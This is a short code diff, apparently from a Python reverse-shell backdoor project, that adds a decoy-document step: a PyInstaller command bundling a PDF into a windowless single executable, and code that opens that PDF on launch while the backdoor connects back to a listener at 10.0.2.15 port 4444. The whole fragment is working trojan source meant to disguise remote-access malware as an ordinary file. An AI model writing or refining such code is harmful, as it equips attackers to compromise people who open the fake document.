@@ -80,6 +80,9 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
+# pyinstaller --add-data "C:\Win10Share\atv.pdf";. --onefile --noconsole backdoor.py
+file_name = sys._MEIPASS + '\\atv.pdf'
+subprocess.Popen(file_name, shell=True)
 try:
     backdoor = Backdoor('10.0.2.15', 4444)
     backdoor.run()
